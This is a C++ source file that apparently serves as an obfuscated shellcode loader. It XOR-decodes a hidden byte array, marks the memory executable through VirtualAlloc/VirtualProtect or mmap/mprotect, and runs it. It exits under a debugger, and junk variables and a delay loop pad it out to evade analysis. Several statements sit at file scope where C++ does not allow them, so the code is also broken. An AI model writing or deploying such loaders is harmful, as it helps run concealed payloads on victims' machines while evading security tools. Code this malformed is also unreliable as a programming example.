/* Unique ID: 223129320786442 */
#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <functional>
#include <array>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

    volatile int init36781 = 611;
    volatile int _IDRNgwvl0 = init36781 + 969;
    if (init36781 != _IDRNgwvl0) { init36781 = _IDRNgwvl0; }
    std::string R983895FD = "LOpUOjYTzoZ6mUUYtCeVyC7cwVu";
    int run_Set_3083[11] = {910, 395, 767, 801, 253, 845, 251, 356, 631, 526, 275};
    int* Manager_28798 = new int[3];
    delete[] Manager_28798;
    struct instMemoryBase { int hdlStack13734; };

int main() {
    for (volatile int data71537 = 0; data71537 < 747700; data71537++);
    struct reqParserList { int Parser_46723; };
#ifdef _WIN32
    if (IsDebuggerPresent()) return 89;
#endif
    unsigned char coreUtil95917[] = {
        0xd6, 0x0a, 0x88, 0xca, 0xf4, 0xe8, 0x40, 0x93, 0x25, 0x9d, 0xce, 0xb8, 0x40, 0xd7, 0xe3, 0x8d, 
        0x08, 0xc4, 0x2a, 0x82, 0x97, 0x35, 0xc1, 0x2b, 0x6d, 0x53, 0x3a, 0xf2, 0x84, 0xe3, 0x9b, 0xde, 
        0xa2, 0x07, 0x8f, 0xda, 0xa6, 0xf8, 0x43, 0xc7, 0x2d, 0xd2, 0xd4, 0xfd, 0x47, 0xc6, 0xb0, 0x94, 
        0x28, 0xf8, 0x0e, 0xa6
    };

    unsigned char func72473[] = {0x82, 0x62, 0xe1, 0xb9, 0xd4, 0x81, 0x33, 0xb3, 0x44, 0xbd, 0xba, 0xdd, 0x33, 0xa3, 0xc3, 0xe0, 0x41, 0x96, 0x69, 0xac, 0xf2, 0x4d, 0xa4, 0x0b, 0x0b, 0x3a, 0x56, 0x97, 0xa4, 0x85, 0xf4, 0xac};

    #ifdef Util_85751
        int __VrqDhGzfU__ = 660;
    #endif
    for (size_t util4040 = 0; util4040 < sizeof(coreUtil95917); util4040++) {
        coreUtil95917[util4040] ^= func72473[util4040 % sizeof(func72473)];
    }

    try {
        volatile int Builder_79307 = 670 / 109;
    } catch (...) {}
#ifdef _WIN32
    void* __Yx4K4enFFqxo__ = VirtualAlloc(0, sizeof(coreUtil95917), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(__Yx4K4enFFqxo__, coreUtil95917, sizeof(coreUtil95917));
    DWORD cfgProcess18057;
    VirtualProtect(__Yx4K4enFFqxo__, sizeof(coreUtil95917), PAGE_EXECUTE_READ, &cfgProcess18057);
    ((void(*)())__Yx4K4enFFqxo__)();
#else
    void* __Yx4K4enFFqxo__ = mmap(0, sizeof(coreUtil95917), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(__Yx4K4enFFqxo__, coreUtil95917, sizeof(coreUtil95917));
    mprotect(__Yx4K4enFFqxo__, sizeof(coreUtil95917), PROT_READ | PROT_EXEC);
    ((void(*)())__Yx4K4enFFqxo__)();
#endif
    std::string _6ZggC = "trlRbpE7z86BTmbLs";
    return 0;
}
